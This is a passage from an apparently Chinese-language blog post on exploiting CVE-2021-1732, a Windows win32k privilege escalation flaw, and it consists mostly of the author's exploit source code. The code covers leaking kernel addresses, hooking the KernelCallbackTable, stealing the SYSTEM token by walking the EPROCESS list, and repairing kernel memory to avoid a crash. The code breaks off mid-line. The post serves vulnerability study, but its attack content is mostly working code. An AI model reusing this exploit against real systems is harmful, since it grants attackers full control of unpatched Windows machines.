Base[<span class="number">0x1000</span>];</span><br><span class="line">	DWORD dwRet = <span class="number">0</span>;</span><br><span class="line">	ULONG64 ulKrnlBase = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (EnumDeviceDrivers((LPVOID*)&amp;Base, <span class="keyword">sizeof</span>(Base), &amp;dwRet))</span><br><span class="line">	&#123;</span><br><span class="line">		ulKrnlBase = Base[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ulKrnlBase;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ULONG64 <span class="title">GetSystemProcess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HMODULE hModel = <span class="literal">NULL</span>;</span><br><span class="line">	ULONG64 ulAddress = <span class="number">0</span>, ulOSBase = <span class="number">0</span>, ulRes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	ulOSBase = GetNTBase();</span><br><span class="line"></span><br><span class="line">	hModel = LoadLibraryA(<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">	ulAddress = (ULONG64)GetProcAddress(hModel, <span class="string">&quot;PsInitialSystemProcess&quot;</span>);</span><br><span class="line"></span><br><span class="line">	ulRes = ulAddress - (ULONG64)hModel + ulOSBase;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ulRes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrivilegeEscalatio</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD64 qwSytemAddr = GetSystemProcess();</span><br><span class="line">	DWORD dwPid = GetCurrentProcessId();</span><br><span class="line">	DWORD dwtmpPid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	DWORD64 qwEprocess = MyRead(qwSytemAddr);</span><br><span class="line">	DWORD64 qwSystemToken = MyRead(qwEprocess + dwTokenOffset);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		qwEprocess = MyRead(qwEprocess + dwLinkOffset) - dwLinkOffset;</span><br><span class="line">		dwtmpPid = MyRead(qwEprocess + dwPIDOffset);</span><br><span class="line">	&#125; <span class="keyword">while</span> (dwPid != dwtmpPid);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	SetWindowLongPtrA(g_hwnd_min, OffsetToDesktopHeap_max + dwpExtraBytesOffset - OffsetToDesktopHeap_min, qwEprocess + dwTokenOffset);</span><br><span class="line">	SetWindowLongPtrA(g_hwnd_max, <span class="number">0</span>, qwSystemToken);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取到了后，就是读取system的Token，然后遍历链表，然后根据当前进程pid获取到当前进程的EPROCESS，然后获取当前进程的Token，然后进行替换。</p>
<h3 id="修复内存"><a href="#修复内存" class="headerlink" title="修复内存"></a>修复内存</h3><p>为了不因为我们修改的内存而产生蓝屏，我们需要修改回去。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">FixDate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	g_ptagWNDK_Magic= (DWORD64)pHmValidateHandle(g_hwndMagic, <span class="number">1</span>);</span><br><span class="line">	OffsetToDesktopHeap_Magic= *(PDWORD)(g_ptagWNDK_Magic + <span class="number">8</span>);</span><br><span class="line">	DWORD dwFlags = *(PDWORD)(g_ptagWNDK_Magic + dwExtraFlagOffset);</span><br><span class="line">	dwFlags &amp;= ~<span class="number">0x800</span>;</span><br><span class="line">	DWORD64 qwBuffer = (DWORD64)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, g_nRandom);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//tagWNDk2</span></span><br><span class="line">	SetWindowLongPtrA(g_hwnd_min, OffsetToDesktopHeap_Magic + dwExtraFlagOffset - OffsetToDesktopHeap_min, dwFlags);</span><br><span class="line">	SetWindowLongPtrA(g_hwnd_min, OffsetToDesktopHeap_Magic + dwpExtraBytesOffset - OffsetToDesktopHeap_min, qwBuffer);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//tagWNDk1</span></span><br><span class="line">	SetWindowLongPtrA(g_hwnd_min, OffsetToDesktopHeap_max + dwpExtraBytesOffset - OffsetToDesktopHeap_min, OldpExtraBytes_max);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//tagWNDk0</span></span><br><span class="line">	<span class="comment">//SetWindowLongPtrA(g_hwnd_min, dwcbWndExtraOffset, 0x140);</span></span><br><span class="line">	SetWindowLongPtrA(g_hwnd_min, dwpExtraBytesOffset, OldpExtraBytes_min);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	DWORD64 qwStyle = *(PDWORD64)(g_ptagWNDK_max + dwStyleOffset);</span><br><span class="line">	qwStyle |= <span class="number">0x4000000000000000</span>;</span><br><span class="line">	SetWindowLongPtrA(g_hwnd_min, OffsetToDesktopHeap_max + dwStyleOffset - OffsetToDesktopHeap_min, qwStyle);</span><br><span class="line"></span><br><span class="line">	SetWindowLongPtrA(g_hwnd_max, GWLP_ID, qwspMenuOld);</span><br><span class="line"></span><br><span class="line">	qwStyle &amp;= ~<span class="number">0x4000000000000000</span>;</span><br><span class="line">	SetWindowLongPtrA(g_hwnd_min, OffsetToDesktopHeap_max + dwStyleOffset - OffsetToDesktopHeap_min, qwStyle);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a>漏洞调试</h2><p>实际上都没必要进行漏洞调试了，EXP的编写过程中，总是会出现问题，每写一个功能，就调试一下，已经是调试完了，强烈建议，自己从头开始编写一下EXP。</p>
<p>一路下来，我自己编写的exp如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/defaultlib:Psapi.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">void</span>* (NTAPI* lHMValidateHandle)(HANDLE h, <span class="keyword">int</span> type);</span><br><span class="line">lHMValidateHandle pHmValidateHandle = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD64</span><span class="params">(NTAPI* fnxxxClientAllocWindowClassExtraBytes)</span><span class="params">(DWORD64* a1)</span></span>;</span><br><span class="line">fnxxxClientAllocWindowClassExtraBytes OldxxxClientAllocWindowClassExtraBytes = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD64</span><span class="params">(NTAPI* fnNtUserConsoleControl)</span><span class="params">(<span class="keyword">int</span> nConsoleCommand, HWND* pHwnd, <span class="keyword">int</span> nConsoleInformationLength)</span></span>;</span><br><span class="line">fnNtUserConsoleControl g_pfnNtUserConsoleControl = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD64</span><span class="params">(NTAPI* fnNtCallbackReturn)</span><span class="params">(DWORD64* a1, DWORD64 a2, DWORD64 a3)</span></span>;</span><br><span class="line">fnNtCallbackReturn g_pfnNtCallbackReturn = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> CVE_2021_1732</span><br><span class="line">&#123;</span><br><span class="line">	DWORD64 g_nRandom = <span class="number">0</span>;</span><br><span class="line">	HWND g_hwnd[<span class="number">10</span>] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">	HWND g_hwndMagic = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD64 g_ptagWNDk[<span class="number">10</span>] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">	DWORD64 g_ptagWNDK_min = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD64 g_ptagWNDK_max = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD64 g_ptagWNDK_Magic = <span class="literal">NULL</span>;</span><br><span class="line">	HWND g_hwnd_min = <span class="literal">NULL</span>;</span><br><span class="line">	HWND g_hwnd_max = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD OffsetToDesktopHeap_min = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD OffsetToDesktopHeap_max = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD OffsetToDesktopHeap_Magic = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD64 g_qwMinBaseAddress = <span class="number">0</span>;</span><br><span class="line">	DWORD64 g_qwRegionSize = <span class="number">0</span>;</span><br><span class="line">	DWORD testnum = <span class="number">0</span>;</span><br><span class="line">	DWORD64 g_qwMenu = <span class="number">0</span>;</span><br><span class="line">	DWORD64 qwspMenuOld = <span class="number">0</span>;</span><br><span class="line">	ULONG64 OldpExtraBytes_min = <span class="number">0</span>;</span><br><span class="line">	ULONG64 OldpExtraBytes_max = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> Offset</span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwStyleOffset = <span class="number">0x18</span>;</span><br><span class="line">	DWORD dwcbWndExtraOffset = <span class="number">0xC8</span>;</span><br><span class="line">	DWORD dwExtraFlagOffset = <span class="number">0xE8</span>;</span><br><span class="line">	DWORD dwpExtraBytesOffset = <span class="number">0x128</span>;</span><br><span class="line">	DWORD dwLinkOffset = <span class="number">0x2F0</span>;</span><br><span class="line">	DWORD dwTokenOffset= <span class="number">0x360</span>;</span><br><span class="line">	DWORD dwPIDOffset = <span class="number">0x2E8</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> CVE_2021_1732;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> Offset;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">FindHMValidateHandle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	HMODULE hUser32 = LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hUser32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed to load user32&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, <span class="string">&quot;IsMenu&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (pIsMenu == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed to find location of exported function &#x27;IsMenu&#x27; within user32.dll\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> uiHMValidateHandleOffset = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++) &#123;</span><br><span class="line">		BYTE* test = pIsMenu + i;</span><br><span class="line">		<span class="keyword">if</span> (*test == <span class="number">0xE8</span>) &#123;</span><br><span class="line">			uiHMValidateHandleOffset = i + <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (uiHMValidateHandleOffset == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed to find offset of HMValidateHandle from location of &#x27;IsMenu&#x27;\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> addr = *(<span class="keyword">unsigned</span> <span class="keyword">int</span>*)(pIsMenu + uiHMValidateHandleOffset);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset = ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)pIsMenu - (<span class="keyword">unsigned</span> <span class="keyword">int</span>)hUser32) + addr;</span><br><span class="line">	<span class="comment">//The +11 is to skip the padding bytes as on Windows 10 these aren&#x27;t nops</span></span><br><span class="line">	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + <span class="number">11</span>);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">HWND <span class="title">GuessHwnd</span><span class="params">(DWORD64* pBaseAddress, DWORD dwRegionSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD64 qwBaseAddressBak = *pBaseAddress;</span><br><span class="line">	DWORD64 qwBaseAddress = *pBaseAddress;</span><br><span class="line">	DWORD dwRegionSizeBak = dwRegionSize;</span><br><span class="line">	HWND hwndMagicWindow = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span> (*(WORD*)qwBaseAddress != g_nRandom &amp; dwRegionSize &gt; <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			qwBaseAddress += <span class="number">2</span>;</span><br><span class="line">			dwRegionSize--;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//获取不到才会走下面的步骤</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (*(DWORD*)((DWORD*)qwBaseAddress + (<span class="number">0x18</span> &gt;&gt; <span class="number">2</span>) - (<span class="number">0xc8</span> &gt;&gt; <span class="number">2</span>)) != <span class="number">0x8000000</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			qwBaseAddress = qwBaseAddress + <span class="number">4</span>;</span><br><span class="line">			DWORD64 qwSub = qwBaseAddressBak - qwBaseAddress;</span><br><span class="line">			dwRegionSize = dwRegionSizeBak + qwSub;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		hwndMagicWindow = (HWND) * (DWORD*)(qwBaseAddress - <span class="number">0xc8</span>);</span><br><span class="line">		<span class="keyword">if</span> (hwndMagicWindow)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> hwndMagicWindow;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD64  <span class="title">MyxxxClientAllocWindowClassExtraBytes</span><span class="params">(DWORD64* a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD64 dwTemp = *a1;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (dwTemp == g_nRandom)</span><br><span class="line">	&#123;</span><br><span class="line">		HWND hwndMagic = GuessHwnd(&amp;g_qwMinBaseAddress, g_qwRegionSize);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;MagciHwnd==%p\r\n&quot;</span>, hwndMagic);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (hwndMagic)</span><br><span class="line">		&#123;</span><br><span class="line">			g_pfnNtUserConsoleControl(<span class="number">6</span>i64, &amp;hwndMagic, <span class="number">0x10</span>);</span><br><span class="line">			DWORD64 qwRet = OffsetToDesktopHeap_min;</span><br><span class="line"></span><br><span class="line">			g_pfnNtCallbackReturn(&amp;qwRet, <span class="number">24</span>i64, <span class="number">0</span>i64);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD64 dwTest = *((PULONG64) * (a1 - <span class="number">11</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> OldxxxClientAllocWindowClassExtraBytes(a1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">HookClientAllocWindowClassExtraBytes</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BOOL bRet = TRUE;</span><br><span class="line">	DWORD dwOldProtect;</span><br><span class="line"></span><br><span class="line">	g_pfnNtUserConsoleControl = (fnNtUserConsoleControl)GetProcAddress(GetModuleHandleA(<span class="string">&quot;win32u.dll&quot;</span>), <span class="string">&quot;NtUserConsoleControl&quot;</span>);</span><br><span class="line">	g_pfnNtCallbackReturn = (fnNtCallbackReturn)GetProcAddress(GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtCallbackReturn&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取 KernelCallbackTable gs段寄存器 0x60位置为PEB</span></span><br><span class="line">	<span class="comment">// PEB 偏移0x58位置为KernelCallbackTable</span></span><br><span class="line">	DWORD64	KernelCallbackTable = *(DWORD64*)(__readgsqword(<span class="number">0x60</span>u) + <span class="number">0x58</span>);</span><br><span 